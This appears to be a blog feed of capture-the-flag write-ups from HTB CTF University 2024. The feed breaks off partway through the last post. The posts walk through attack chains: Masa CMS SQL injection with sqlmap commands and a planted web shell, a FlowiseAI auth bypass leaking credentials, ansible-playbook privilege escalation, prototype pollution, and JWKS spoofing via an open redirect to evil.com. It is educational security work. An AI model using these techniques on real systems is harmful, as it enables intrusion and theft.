[{"content":"Fullpwn - Freedom In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.\nUser Enumeration starting with port canning, we found that the machine are running Windows due to kerberos port (88) opened.\nWeb Application I started to enumerate web apps, which redirected into /index.cfm. cfm file extension are used for ColdFusion. there\u0026rsquo;s nothing much in the landing page, which then i decided to perform directory scan. Here i found several interesting results such as /README.md and /admin In the README.md files, i found that web application running Masa CMS if we try to open the /admin path, then we can also confirm that Masa CMS is being used. continuing with the directory scan, i found other interesting files named box.json. It seems like version 7.4.5 or Masa CMS is being used right now.\nMasaCMS Exploit After searching for known exploit of Masa CMS, i found this interesting article by projectdiscovery which disclose about pre-auth sql injection in Masa CMS version 7.4.5. Perfect!\nThey also provide attack scenario to obtain RCE in the Masa CMS as well. Based on the article, it seems like the Masa CMS are vulnerable to error-based SQL Injection. So i use sqlmap to dump the database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;%5c\u0026#39;\u0026#34; --batch Alternatively, we can also view the database schema in the source code.\nIn order to achieve RCE, we need to reset user password. I use following command to dump user lists from database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;x%5c\u0026#39;\u0026#34; --batch --dump -D dbMasaCMS -T tusers it seems like admin email was admin@freedom.htb\nusing the email address, we can invoke password reset from the /admin endpoint.\nAfter that, we need to obtain reset token and user id from database. We didn\u0026rsquo;t know where exactly the value is, and try to dump all table in dbMasaCMS database instead.\nAfter waiting for a while, we found interesting output within tredirects table.\nThe url can be used to reset admin password, nice!\nCrafting MuraCMS Plugin in order to obtain code execution, we need to upload our own plugin. This can be performed under Plugins \u0026gt; Add Plugin menu. I was lazy to create the plugin from scratch, so i decided to search for public available plugin, which i found from the MasaCMS repository itself\nI replace the content of MasaGoogleSitemaps-main\\admin\\views\\main\\default.cfm using backdoor shell from laudanum.\nThen i zip the plugin content and uploaded it. However, it shows error like this.\nFortunately, this error can be ignored. I just need to back to previous page and click for update button.\nVoila, plugin is uploaded! To access the plugin, click on it\u0026rsquo;s name This will redirect into /plugins/MasaGoogleSitemaps/ with forbidden result, what?? Luckily, we can remove the restriction by appending /index.cfm to the site. Shell is now opened, however we can\u0026rsquo;t see the content due to access restriction in the shell itself. We need to set X-Auth-Code header with value taken from the source code. Shell can be accessed now WSL Escape? When i execute whoami, it returning root instead of windows user?? I easily guess that this is probably wsl. Using mount command, i found that this is indeed an wsl intances that mounting drive C:\\ from windows. We can access windows file\u0026rsquo;s from it. User flag also can be obtained within /mnt/c/Users/j.bret/Desktop/user.txt\nFlag: HTB{c4n_y0u_pl34as3_cr4ck?}\nRoot well, this is weird. But we can also read root flag using wsl privileges lol\nroot flag located in /mnt/c/Users/Administrator/Desktop/root.txt\nFlag:HTB{l34ky_h4ndl3rs_4th3_w1n}\n","date":"2024-12-19T02:22:27.837Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-freedom/banner.jpg","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-freedom/","title":"[HTB CTF University 2024] - Freedom"},{"content":"Fullpwn - Apolo In the lawless expanse of the Frontier Cluster, Apolo serves as a beacon of security, working to safeguard the Frontier Clusterâ€™s assets from bounty hunters.\nUser Enumeration port scan showing two active port, 22 and 80.\nUsing curl, i managed to obtain server name, which is apolo.htb.\nWeb Application i add the domain name into /etc/hosts and starting to enumerate the web pages In one of the link, i found a subdomain ai.apolo.htb FlowiseAI Exploit I add the subdomain into /etc/hosts and starting to access the site. It seems like it use FlowiseAI. It seems that FlowiseAI have authentication bypass vulnerability.\nusing the technique mentioned on the exploitdb, i managed to bypsas authentication and obtain credentials id.\n1 2 3 4 5 6 7 8 9 [ { \u0026#34;id\u0026#34;: \u0026#34;6cfda83a-b055-4fd8-a040-57e5f1dae2eb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MongoDB\u0026#34;, \u0026#34;credentialName\u0026#34;: \u0026#34;mongoDBUrlApi\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;updatedDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34; } ] The id can be used to read the value of mongodb creds. 1 2 3 4 5 6 7 8 9 10 { \u0026#34;id\u0026#34;: \u0026#34;6cfda83a-b055-4fd8-a040-57e5f1dae2eb\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MongoDB\u0026#34;, \u0026#34;credentialName\u0026#34;: \u0026#34;mongoDBUrlApi\u0026#34;, \u0026#34;createdDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;updatedDate\u0026#34;: \u0026#34;2024-11-14T09:02:56.000Z\u0026#34;, \u0026#34;plainDataObj\u0026#34;: { \u0026#34;mongoDBConnectUrl\u0026#34;: \u0026#34;mongodb+srv://lewis:C0mpl3xi3Ty!_W1n3@cluster0.mongodb.net/myDatabase?retryWrites=true\u0026amp;w=majority\u0026#34; } } There\u0026rsquo;s pair of credentials there, which is lewis:C0mpl3xi3Ty!_W1n3.\nThe credentials can be used to logged in using ssh.\nFlag: HTB{llm_ex9l01t_4_RC3}\nRoot Our current user have permission to run rclone as root using sudo.\nUnfortunately, rclone is not listed in GTFOBins site Then i try to check for it\u0026rsquo;s docouomentation, and found that it have cat options that can be used to read files. I can easily read root flag using following command. Flag: HTB{cl0n3_rc3_f1l3}\n","date":"2024-12-19T02:16:44.843Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-apolo/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-apolo/","title":"[HTB CTF University 2024] - Apolo"},{"content":"Fullpwn - Clouded In the lawless expanse of the Frontier Cluster, Clouded emerges as a beacon of efficiency and security for file sharing. Breakthrough their cloud servers to obtain the secrets to finding the Starry Spur. Allow up to 1 minute for all the services to properly boot.\nUser Enumeration Upon scanning the ports, we found that port 22 and 80 are open.\nwhen try to access the port 80, it was redirected into clouded.htb. We try to enumerate subdomain using ffuf command below, and found other subdomain named local.clouded.htb we add those two hostnames into /etc/hosts.\nWeb application The web page have several page, but the intersting one is Upload page. It allows user to upload several type of content. If we try to upload any content, it will return uploaded file location from local.clouded.htb subdomain. Cloud instances Using curl, i was able to identify that the site was hosted using aws, probably an s3 bucket I try to use aws-cli to enumerate the instances further, however i got permission denied i then try to enumerate further, started with directory enumration. I found that the application accept urlencoded form of ?. and after playing with other character, i noticed that the site also vulnerable to directory traversal, which allow me to bypass the restriction and access the bucket. it have file named backup.db which can be downloaded directly using link below http://local.clouded.htb/uploads/..%2F/clouded-internal/backup.db\nthe backup contains a lot of name and password in md5 format. SSH Bruteforce i managed to crack all the password and proceeding to create wordlists based on available information.\ni\u0026rsquo;ve tried multiple username combination based on username-anarchy. but in the end, the pair was simple. It was lastname:password.\nI managed to obtain correct credentials, which was nagato:alicia\nflag was located in /home/nagato/flag.txt\nRoot After obtaining low privilege user, i try to enumerate further. Aparently, nagato is part of frontiers group, which have access for /opt/infra-setup. It containing yml script, potentially used for healthcheck. If we try to monitor any process using pspy, then we can see that root user are running ansible using yml file mentioned before. ansible-playbook rce Using script from 0xdf, we can gain command execution using following yml code. Note that i made modification because i was lazy to setup reverse shell in my windows machine lol.\n1 2 3 4 - hosts: localhost tasks: - name: rev shell: bash -c \u0026#39;chmod u+s /bin/bash\u0026#39; since we dont have write permission into checkup.yml, we can\u0026rsquo;t modify the file directly. However since we have write permission on the directory itself, we can delete or rename the file into something else. This way, we can create new file with name of checkup.yml and inject the malicious script. After waiting for a while, the /bin/bash permission was modified into a SUID binary. Now we can obtain root shell by executing /bin/bash -p\nroot flag obtained! Flag: HTB{H@ZY_71ME5_AH3AD}\n","date":"2024-12-18T22:16:07+07:00","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-clouded/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-clouded/","title":"[HTB CTF University 2024] - Clouded"},{"content":"Web - Intergalactic Bounty The Galactic Bounty Exchangeâ€”a system where hunters and hunted collide, controlled by the ruthless Frontier Board. Hidden within its encrypted core lies a prize of untold power: the bounty for the Starry Spur. To ignite rebellion, Jack Colt must infiltrate this fortress of contracts, manipulate its algorithms, and claim the Spurâ€™s bounty for himself. A race against time, a battle against the galaxyâ€™s deadliest systemâ€”Jackâ€™s mission will decide the fate of the Frontier.\nAnalaysis We are given nodejs application and email service with address of test@email.htb. The setup were pretty much like Armaxis.\nBased on the flag location in the source code, we need to obtain at least arbitrary file read or command execution in the application.\n1 COPY flag.txt / Bot Bot was found within the source code. It means there\u0026rsquo;s probably a client side vulnerability such as CSRF, XSS, and others.\nusing bot is the intended way to solve the challenge, however i\u0026rsquo;m using unintended solution to solve the problem\nEmail Discrepancy \u0026amp; Privilege Escalation In order to log in to the application, users need to register with the interstellar.htb domain. However, our accessible email domain is email.htb.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const emailAddresses = require(\u0026#39;email-addresses\u0026#39;); const registerAPI = async (req, res) =\u0026gt; { const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; const emailDomain = emailAddresses.parseOneAddress(email)?.domain; if (!emailDomain || emailDomain !== \u0026#39;interstellar.htb\u0026#39;) { return res.status(200).json({ message: \u0026#39;Registration is not allowed for this email domain\u0026#39; }); } try { await User.createUser(email, password, role); return res.json({ message: \u0026#34;User registered. Verification email sent.\u0026#34;, status: 201 }); } catch (err) { return res.status(500).json({ message: err.message, status: 500 }); } }; If email whitelist can be bypassed, we can register as admin due to parameter pollution in request parser.\n1 const { email, password, role = \u0026#34;guest\u0026#34; } = req.body; privilege escalation can be achieved using following request data upon registration.\n1 2 3 4 5 { \u0026#34;username\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;x\u0026#34;, \u0026#34;role\u0026#34;: \u0026#34;admin\u0026#34; } in order to beat the email parser, i try to read the documentation and source code of email-addresses, which i found several test cases of parseOneAddress successfull email format.\none of the interesting format is \u0026quot;FranÃ§oise LefÃ¨vre\u0026quot;@example.com.\nAfter playing with the format for a while, \u0026quot;test@email.htb test\u0026quot;@interstellar.htb was working perfectly!\nThis is because email parsing disrepancy between email-address and nodemailer. nodemailer will convert the email to following format, which will interpret test@interstellar.htb as a alias, and set test@email.htb as the email address.\nCode can be retrieved in the email Prototype Pollution in one of the admin feature, it uses mergedeep function. Usually, function related with merge in javascript environment is vulnerable to prototype pollution.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 const mergedeep = require(\u0026#34;@christopy/mergedeep\u0026#34;); const editBountiesAPI = async (req, res) =\u0026gt; { const { ...bountyData } = req.body; try { const data = await BountyModel.findByPk(req.params.id, { attributes: [ \u0026#34;target_name\u0026#34;, \u0026#34;target_aliases\u0026#34;, \u0026#34;target_species\u0026#34;, \u0026#34;last_known_location\u0026#34;, \u0026#34;galaxy\u0026#34;, \u0026#34;star_system\u0026#34;, \u0026#34;planet\u0026#34;, \u0026#34;coordinates\u0026#34;, \u0026#34;reward_credits\u0026#34;, \u0026#34;reward_items\u0026#34;, \u0026#34;issuer_name\u0026#34;, \u0026#34;issuer_faction\u0026#34;, \u0026#34;risk_level\u0026#34;, \u0026#34;required_equipment\u0026#34;, \u0026#34;posted_at\u0026#34;, \u0026#34;status\u0026#34;, \u0026#34;image\u0026#34;, \u0026#34;description\u0026#34;, \u0026#34;crimes\u0026#34;, \u0026#34;id\u0026#34;, ], }); if (!data) { return res.status(404).json({ message: \u0026#34;Bounty not found\u0026#34; }); } const updated = mergedeep(data.toJSON(), bountyData); await data.update(updated); return res.json(updated); } catch (err) { console.log(err); return res.status(500).json({ message: \u0026#34;Error fetching data\u0026#34; }); } }; if we take a look at the source code, it was clear that the library doesn\u0026rsquo;t prevent for prototype pollution and assign value directly into the target object.\nsimple payload such as {\u0026quot;__proto__\u0026quot;: {\u0026quot;test\u0026quot;:\u0026quot;yey\u0026quot;}} can be used to trigger the vulnerability.\nFinding Gadget Usually, prototype pollution in CTF are combined with child_process function such as fork, execSync, exec, etc. However there\u0026rsquo;s none of them in the current application.\nIn order to find gadget to obtain either arbitrary file read or command execution, i decided to explore all library used in the application.\nOne of the interesting library is needle\n1 2 3 4 5 6 7 { \u0026#34;dependencies\u0026#34;: { \u0026#34;@christopy/mergedeep\u0026#34;: \u0026#34;^1.0.4\u0026#34;, \u0026#34;lodash\u0026#34;: \u0026#34;^4.17.21\u0026#34;, \u0026#34;needle\u0026#34;: \u0026#34;^3.3.1\u0026#34; } } The library is used to fetch data from web service. The usage is definitely eye catching because most of nodejs application uses axios to fetch pages from internet. So there must be something in the needle library.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 const needle = require(\u0026#34;needle\u0026#34;); const fetchURL = async (url) =\u0026gt; { if (!url.startsWith(\u0026#34;http://\u0026#34;) \u0026amp;\u0026amp; !url.startsWith(\u0026#34;https://\u0026#34;)) { throw new Error(\u0026#34;Invalid URL: URL must start with http or https\u0026#34;); } const options = { compressed: true, follow_max: 0, }; return new Promise((resolve, reject) =\u0026gt; { needle.get(url, options, (err, resp, body) =\u0026gt; { if (err) { return reject(new Error(\u0026#34;Error fetching the URL: \u0026#34; + err.message)); } resolve(body); }); }); }; After reviewing the documentation and source code of needle, i found that output options is being used to save fetched content into system files.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 if (config.output \u0026amp;\u0026amp; resp.statusCode == 200) { // for some reason, simply piping resp to the writable stream doesn\u0026#39;t // work all the time (stream gets cut in the middle with no warning). // so we\u0026#39;ll manually need to do the readable/write(chunk) trick. var file = fs.createWriteStream(config.output); file.on(\u0026#39;error\u0026#39;, had_error); out.on(\u0026#39;end\u0026#39;, function() { if (file.writable) file.end(); }); file.on(\u0026#39;close\u0026#39;, function() { delete out.file; }) out.on(\u0026#39;readable\u0026#39;, function() { var chunk; while ((chunk = this.read()) !== null) { if (file.writable) file.write(chunk); // if callback was requested, also push it to resp.body if (resp.body) resp.body.push(chunk); } }) out.file = file; } so if we managed to pollute output options and call the fetchURL function, then we can perform arbitrary file write on the system.\nThis can be performed by calling /api/transmit using admin credentials after polluting the output options.\nafter obtaining arbitrary file write, we can try to\nOverwrite javascript files (need restart) Overwrite template files (without restart) DOS Additional bug, if we try to provide invalid url within fetchURL function, aparently the server will shut down.\nBecause the application using supervisord with autorestart=true, then this vulnerability can be used to restart the server after overwriting javascript files.\n1 2 3 4 5 6 7 8 9 [program:node] directory=/app command=node index.js autostart=true autorestart=true stdout_logfile=/dev/stdout stdout_logfile_maxbytes=0 stderr_logfile=/dev/stderr stderr_logfile_maxbytes=0 Exploitation in order to perform full attack, we need to:\nbypass email protection \u0026amp; privilege escalation perform prototype pollution to pollute output options overwrite either javascript or html files trigger the updated code to gain code execution perform the same step for remote, and flag can be obtained :D\nFlag: HTB{f1nd1ng_0d4y_15_345Y_r1gh7!!?_970db3ce5022cd532606efeca829916c}\n","date":"2024-12-18T11:09:50.476Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-intergalactic-bounty/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-intergalactic-bounty/","title":"[HTB CTF University 2024] - Intergalactic Bounty"},{"content":"Web - Breaking Bank In the sprawling digital expanse of the Frontier Cluster, the Frontier Board seeks to cement its dominance by targeting the cornerstone of interstellar commerce: Cluster Credit, a decentralized cryptocurrency that keeps the economy alive. With whispers of a sinister 51% attack in motion, the Board aims to gain majority control of the Cluster Credit blockchain, rewriting transaction history and collapsing the fragile economy of the outer systems. Can you hack into the platform and drain the assets for the financialÂ controller?\nAnalysis We are given nodejs application. Flag can be obtained from checkFinancialControllerDrained method if CLCR coin balance of financial-controller@frontier-board.htb user is less than or equal 0. In other word, we need to drain the wallet of the user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { getBalancesForUser } from \u0026#39;../services/coinService.js\u0026#39;; import fs from \u0026#39;fs/promises\u0026#39;; const FINANCIAL_CONTROLLER_EMAIL = \u0026#34;financial-controller@frontier-board.htb\u0026#34;; /** * Checks if the financial controller\u0026#39;s CLCR wallet is drained * If drained, returns the flag. */ export const checkFinancialControllerDrained = async () =\u0026gt; { const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL); const clcrBalance = balances.find((coin) =\u0026gt; coin.symbol === \u0026#39;CLCR\u0026#39;); if (!clcrBalance || clcrBalance.availableBalance \u0026lt;= 0) { const flag = (await fs.readFile(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf-8\u0026#39;)).trim(); return { drained: true, flag }; } return { drained: false }; }; the checkFinancialControllerDrained method are called within dashboardRouter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { checkFinancialControllerDrained } from \u0026#39;../services/flagService.js\u0026#39;; export default async function dashboardRouter(fastify) { fastify.get(\u0026#39;/\u0026#39;, async (req, reply) =\u0026gt; { if (!req.user) { reply.status(401).send({ error: \u0026#39;Unauthorized: User not authenticated\u0026#39; }); return; } const { email } = req.user; if (!email) { reply.status(400).send({ error: \u0026#39;Email not found in token\u0026#39; }); return; } const { drained, flag } = await checkFinancialControllerDrained(); if (drained) { reply.send({ message: \u0026#39;Welcome to the Dashboard!\u0026#39;, flag }); return; } reply.send({ message: \u0026#39;Welcome to the Dashboard!\u0026#39; }); }); } This function will called when user access /api/dashboard.\n1 securedRoutes.register(dashboardRouter, { prefix: \u0026#39;/api/dashboard\u0026#39; }); ok, so how can we drain admin wallet? let\u0026rsquo;s analyze more.\nOpen Redirection After reading the source code, i found open redirection bug due to missing checking of url parameter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 export default async function analyticsRoutes(fastify) { fastify.get(\u0026#39;/redirect\u0026#39;, async (req, reply) =\u0026gt; { const { url, ref } = req.query; if (!url || !ref) { return reply.status(400).send({ error: \u0026#39;Missing URL or ref parameter\u0026#39; }); } // TODO: Should we restrict the URLs we redirect users to? try { await trackClick(ref, decodeURIComponent(url)); reply.header(\u0026#39;Location\u0026#39;, decodeURIComponent(url)).status(302).send(); } catch (error) { console.error(\u0026#39;[Analytics] Error during redirect:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to track analytics data.\u0026#39; }); } }); fastify.get(\u0026#39;/data\u0026#39;, async (req, reply) =\u0026gt; { const { start = 0, limit = 10 } = req.query; try { const analyticsData = await getAnalyticsData(parseInt(start), parseInt(limit)); reply.send(analyticsData); } catch (error) { console.error(\u0026#39;[Analytics] Error fetching data:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to fetch analytics data.\u0026#39; }); } }); } this route are defined with\n1 fastify.register(analyticsRoutes, { prefix: \u0026#39;/api/analytics\u0026#39; }); so we can perform open redirection using following url /api/analytics/redirect?ref=a\u0026amp;url=redirected.com\nJWKS Spoofing The application uses RS256 algorithm. This mean that JWT token will be signed using Private Key and validated using Public Key.\nThere\u0026rsquo;s a weakness in the token validation mechanism that lead to JWKS Spoofing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 export const verifyToken = async (token) =\u0026gt; { try { const decodedHeader = jwt.decode(token, { complete: true }); if (!decodedHeader || !decodedHeader.header) { throw new Error(\u0026#39;Invalid token: Missing header\u0026#39;); } const { kid, jku } = decodedHeader.header; if (!jku) { throw new Error(\u0026#39;Invalid token: Missing header jku\u0026#39;); } // TODO: is this secure enough? if (!jku.startsWith(\u0026#39;http://127.0.0.1:1337/\u0026#39;)) { throw new Error(\u0026#39;Invalid token: jku claim does not start with http://127.0.0.1:1337/\u0026#39;); } if (!kid) { throw new Error(\u0026#39;Invalid token: Missing header kid\u0026#39;); } if (kid !== KEY_ID) { return new Error(\u0026#39;Invalid token: kid does not match the expected key ID\u0026#39;); } let jwks; try { const response = await axios.get(jku); if (response.status !== 200) { throw new Error(`Failed to fetch JWKS: HTTP ${response.status}`); } jwks = response.data; } catch (error) { throw new Error(`Error fetching JWKS from jku: ${error.message}`); } if (!jwks || !Array.isArray(jwks.keys)) { throw new Error(\u0026#39;Invalid JWKS: Expected keys array\u0026#39;); } const jwk = jwks.keys.find((key) =\u0026gt; key.kid === kid); if (!jwk) { throw new Error(\u0026#39;Invalid token: kid not found in JWKS\u0026#39;); } if (jwk.alg !== \u0026#39;RS256\u0026#39;) { throw new Error(\u0026#39;Invalid key algorithm: Expected RS256\u0026#39;); } if (!jwk.n || !jwk.e) { throw new Error(\u0026#39;Invalid JWK: Missing modulus (n) or exponent (e)\u0026#39;); } const publicKey = jwkToPem(jwk); const decoded = jwt.verify(token, publicKey, { algorithms: [\u0026#39;RS256\u0026#39;] }); return decoded; } catch (error) { console.error(`Token verification failed: ${error.message}`); throw error; } }; it will try to decode jwt token, parse jku and check wether it starts with http://127.0.0.1:1337/. This approach is unsafe if open redirection is found in the application. Luckily, we already found open redirect vulnerability earlier.\nWe can use redirection to bypass the validation by using link such as http://127.0.0.1:1337/redirect?url=evil.com so it will fetch content from evil.com instead of 127.0.0.1. This way we can provide our own public key for token validation, while encrypting the token using our own private key.\nUsing this method, we can create arbitrary token and able to logged in as anyone in the site.\nOTP Bypass In order to perform transaction, application will try to perform several check\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 fastify.post( \u0026#39;/transaction\u0026#39;, { preHandler: [rateLimiterMiddleware(), otpMiddleware()] }, async (req, reply) =\u0026gt; { const { to, coin, amount } = req.body; const userId = req.user.email; try { if (!to || !coin || !amount) { return reply.status(400).send({ error: \u0026#34;Missing required fields\u0026#34; }); } const supportedCoins = await getSupportedCoins(); if (!supportedCoins.includes(coin.toUpperCase())) { return reply.status(400).send({ error: \u0026#34;Unsupported coin symbol.\u0026#34; }); } const parsedAmount = parseFloat(amount); if (isNaN(parsedAmount) || parsedAmount \u0026lt;= 0) { return reply.status(400).send({ error: \u0026#34;Amount must be a positive number.\u0026#34; }); } const userExists = await validateUserExists(to); if (!userExists) { return reply.status(404).send({ error: \u0026#34;Recipient user does not exist.\u0026#34; }); } if (userId === to) { return reply.status(400).send({ error: \u0026#34;Cannot perform transactions to yourself.\u0026#34; }); } const result = await transactionByEmail(to, userId, parseFloat(amount), coin.toUpperCase()); if (!result.success) { return reply.status(result.status).send({ error: result.error }); } reply.send(result); } catch (err) { console.error(\u0026#34;Transaction error:\u0026#34;, err); reply.status(err.status || 500).send({ error: err.error || \u0026#34;An unknown error occurred during the transaction.\u0026#34; }); } } ); It also uses two middleware before performing those checks.\nfrist one is rateLimiterMiddleware() which prevent bruteforce attemp by limiting only 5 request per minute.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { hsetField, hgetField, expireKey } from \u0026#39;../utils/redisUtils.js\u0026#39;; export const rateLimiterMiddleware = (limit = 5, windowInSeconds = 60) =\u0026gt; { return async (req, reply) =\u0026gt; { const userId = req.user.email; const redisKey = `rate-limit:${userId}`; let currentCount = await hgetField(redisKey, \u0026#39;count\u0026#39;); if (!currentCount) { currentCount = 1; await hsetField(redisKey, \u0026#39;count\u0026#39;, currentCount); await expireKey(redisKey, windowInSeconds); } else { currentCount = parseInt(currentCount, 10) + 1; await hsetField(redisKey, \u0026#39;count\u0026#39;, currentCount); } if (currentCount \u0026gt; limit) { reply.status(429).send({ error: \u0026#39;Too many requests. Please try again later.\u0026#39; }); return; } }; }; second is otpMiddleware() which will checks for user OTP in redis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { hgetField } from \u0026#39;../utils/redisUtils.js\u0026#39;; export const otpMiddleware = () =\u0026gt; { return async (req, reply) =\u0026gt; { const userId = req.user.email; const { otp } = req.body; const redisKey = `otp:${userId}`; const validOtp = await hgetField(redisKey, \u0026#39;otp\u0026#39;); console.log(validOtp) if (!otp) { reply.status(401).send({ error: \u0026#39;OTP is missing.\u0026#39; }); return } if (!validOtp) { reply.status(401).send({ error: \u0026#39;OTP expired or invalid.\u0026#39; }); return; } // TODO: Is this secure enough? if (!otp.includes(validOtp)) { reply.status(401).send({ error: \u0026#39;Invalid OTP.\u0026#39; }); return; } }; }; the otp are generated in the server and not given to user. The OTP is being generated for every one minute. So bruteforcing OTP is impossible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 export const generateOtp = () =\u0026gt; { return Math.floor(1000 + Math.random() * 9000).toString(); }; export const setOtpForUser = async (userId) =\u0026gt; { const otp = generateOtp(); const ttl = 60; await setHash(`otp:${userId}`, { otp, expiresAt: Date.now() + ttl * 1000 }); return otp; }; export const rotateOtps = async () =\u0026gt; { try { const userKeys = await getKeysByPattern(\u0026#39;user:*\u0026#39;); const rotatePromises = userKeys.map(async (userKey) =\u0026gt; { const userId = userKey.split(\u0026#39;:\u0026#39;)[1]; await setOtpForUser(userId); }); await Promise.all(rotatePromises); } catch (error) { console.error(\u0026#39;Error during OTP rotation:\u0026#39;, error); } }; export const safelyRotateOtps = async () =\u0026gt; { if (isRotating) { console.warn(\u0026#39;Previous OTP rotation is still in progress. Skipping this interval.\u0026#39;); return; } isRotating = true; try { await rotateOtps(); } catch (error) { console.error(\u0026#39;Error during OTP rotation:\u0026#39;, error); } finally { isRotating = false; } }; setInterval(safelyRotateOtps, 60000); However there\u0026rsquo;s weak validation mechanism for OTP verification because it uses the includes() method, which checks if the valid OTP is anywhere in the user\u0026rsquo;s input.\n1 2 3 4 if (!otp.includes(validOtp)) { reply.status(401).send({ error: \u0026#39;Invalid OTP.\u0026#39; }); return; } check test case below. Although input is not the same, but if the string is \u0026ldquo;included\u0026rdquo; in the full string, then it will return true.\nThis way, we can insert all possible combination of otp in single request, bypassing the validation.\nExploitation so here\u0026rsquo;s the full attack chain:\nBypass JWT to logged in as admin Bypass OTP to drain user balance Access the flag let\u0026rsquo;s register in the website first then login to the site We get valid JWT token in jwt localstorage. and we can also get sample of jwks.json value.\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;tgSoSdh8tbodjwpc4hBKBs_0nZG5Fktdnk6gx401f66G93ibpGthzCdaPpP4fABrImpjO3qg8roK7OKFoxj6DpYINgD1LxUqyaOO3Mm3ZoL_EgKKPzKgUmNZKwL-br6g9JvrlVNjAgG1xmL7csezJ3qaX2FJ21sihvHFa7EiGbydY4sOiEw8p24TfWAi8exaw2DaYeEyj-CoCzhxSzahZR5H9Rc5NnCkhVrK1TIaZAOCFAVs0WAC4BTxPS9MJjgPTEbec97VozzXXOu3c4qIrB0GYM8-gtzEWwqKHLi4uDoSwzeevjbzfbwOE0F_LOFHb7piQBH2dJ78y8rPtIXhYQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;8ff20cff-f538-4af6-97b8-fecd36505989\u0026#34; } ] } now let\u0026rsquo;s create pairs of public \u0026amp; private key. I\u0026rsquo;ll use https://mkjwk.org/\nfill all the required field and generate new key.\nServe public and private keypair set to your vps.\nnow convert the generated keypairs into PEM format. I\u0026rsquo;ll using https://8gwifi.org/. You can use Public and Private Keypair from previous site.\nnow modify token from jwt.io site change value of jwt in local storage and refresh. Now we\u0026rsquo;re logged in as admin.\nIt seems like we need to add friend first to be able to transfer money let\u0026rsquo;s add friend using our registered user login using our user, and accept friend request from admin now sent all CLCR coin to our user using following code, i can generate all combination of otp\n1 print(\u0026#39;\u0026#39;.join(f\u0026#34;{i:04d}\u0026#34; for i in range(10000))) now sent the modified request. it was accepted now if we go back to the dashboard, flag will be given perform same attack in the remote instances to obtain real flag :)\nFlag: HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_c1f72c32f8eb7a20278ef19559bd03ae}\n","date":"2024-12-18T11:07:50.476Z","image":"https://blog.lordrukie.com/p/htb-ctf-university-2024-breaking-bank/banner.png","permalink":"https://blog.lordrukie.com/p/htb-ctf-university-2024-breaking-bank/","title":"[HTB CTF University 2024] - Breaking Bank"},{"content":"Web - Armaxis In the depths of the Frontier, Armaxis powers the enemyâ€™s dominance, dispatching weapons to crush rebellion. Fortified and hidden, it controls vital supply chains. Yet, a flaw whispers of opportunity, a crack to expose its secrets and disrupt their plans. Can you breach Armaxis and turn its power against tyranny?\nAnalysis We are given nodejs application and email service with address of test@wmail.htb.\nBased on the flag location in the source code, we need to at least 